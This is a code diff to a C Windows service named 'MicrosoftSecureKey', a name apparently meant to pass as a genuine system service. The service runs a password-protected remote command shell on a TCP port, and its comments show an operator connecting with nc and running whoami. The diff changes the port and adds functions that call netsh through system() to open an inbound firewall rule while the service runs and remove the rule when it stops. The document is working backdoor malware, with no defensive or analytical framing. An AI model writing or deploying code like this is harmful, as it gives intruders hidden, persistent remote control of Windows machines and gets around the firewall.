@@ -9,7 +9,7 @@
 // sc start MicrosoftSecureKey
 //
 // Command :
-// nc IP_SRV 5555
+// nc IP_SRV 55334
 // Tape Password
 // whoami
 
@@ -25,6 +25,7 @@
 #define BUFFER_SIZE 1024
 #define P4S5 "Password123!"
 #define STOP_COMMAND "STOP_SERVICE"
+#define FIREWALL_RULE_NAME "MicrosoftSecureKey_Port_55334"
 
 SERVICE_STATUS ServiceStatus;
 SERVICE_STATUS_HANDLE hServiceStatusHandle;
@@ -44,7 +45,7 @@ int main(int argc, char *argv[]) {
         {NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain},
         {NULL, NULL}
     };
-    
+
     if (!StartServiceCtrlDispatcher(ServiceTable)) {
         printf("Erreur StartServiceCtrlDispatcher: %d\n", GetLastError());
     }
@@ -59,7 +60,7 @@ void ServiceMain(DWORD argc, LPTSTR *argv) {
 
     ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     ServiceStatus.dwServiceSpecificExitCode = 0;
-    
+
     ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 3000);
     StartServer();
     ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
@@ -71,6 +72,7 @@ void ServiceCtrlHandler(DWORD Opcode) {
             ReportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 0);
             should_stop = TRUE;
             closesocket(server_socket);
+            RemoveFirewallRule();
             ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
             break;
     }
@@ -88,7 +90,7 @@ void ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHi
     else
         ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
 
-    ServiceStatus.dwCheckPoint = ((dwCurrentState == SERVICE_RUNNING) || 
+    ServiceStatus.dwCheckPoint = ((dwCurrentState == SERVICE_RUNNING) ||
                                  (dwCurrentState == SERVICE_STOPPED)) ? 0 : dwCheckPoint++;
 
     SetServiceStatus(hServiceStatusHandle, &ServiceStatus);
@@ -102,9 +104,9 @@ int AuthenticateClient(SOCKET client_socket) {
 
     send(client_socket, auth_request, strlen(auth_request), 0);
     int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);
-    
+
     if (bytes_received <= 0) return 0;
-    
+
     buffer[bytes_received] = '\0';
     char *newline = strchr(buffer, '\n');
     if (newline) *newline = '\0';
@@ -120,6 +122,22 @@ int AuthenticateClient(SOCKET client_socket) {
     }
 }
 
+void AddFirewallRule(void) {
+    char command[256];
+    snprintf(command, sizeof(command),
+             "netsh advfirewall firewall add rule name=\"%s\" dir=in action=allow protocol=TCP localport=%d",
+             FIREWALL_RULE_NAME, PORT);
+    system(command);
+}
+
+void RemoveFirewallRule(void) {
+    char command[256];
+    snprintf(command, sizeof(command),
+             "netsh advfirewall firewall delete rule name=\"%s\"",
+             FIREWALL_RULE_NAME);
+    system(command);
+}
+
 void StartServer(void) {
     WSADATA wsaData;
     SOCKET client_socket;
@@ -128,7 +146,7 @@ void StartServer(void) {
     int client_len = sizeof(client_addr);
 
     WSAStartup(MAKEWORD(2,2), &wsaData);
-    
+
     server_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (server_socket == INVALID_SOCKET) return;
 
@@ -143,6 +161,7 @@ void StartServer(void) {
 
     listen(server_socket, 5);
 
+    AddFirewallRule();
     ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);
 
     while (!should_stop) {
@@ -162,13 +181,14 @@ void StartServer(void) {
             if (bytes_received <= 0) break;
 
             buffer[bytes_received] = '\0';
-            
+
             if (strcmp(buffer, STOP_COMMAND) == 0) {
                 const char *stop_msg = "";
                 send(client_socket, stop_msg, strlen(stop_msg), 0);
                 should_stop = TRUE;
                 closesocket(client_socket);
                 closesocket(server_socket);
+                RemoveFirewallRule();
                 WSACleanup();
                 return;
             }
@@ -184,9 +204,10 @@ void StartServer(void) {
                 send(client_socket, error_msg, strlen(error_msg), 0);
             }
         }
-        
+
         closesocket(client_socket);
     }
-    
+
+    RemoveFirewallRule();
     WSACleanup();
 }
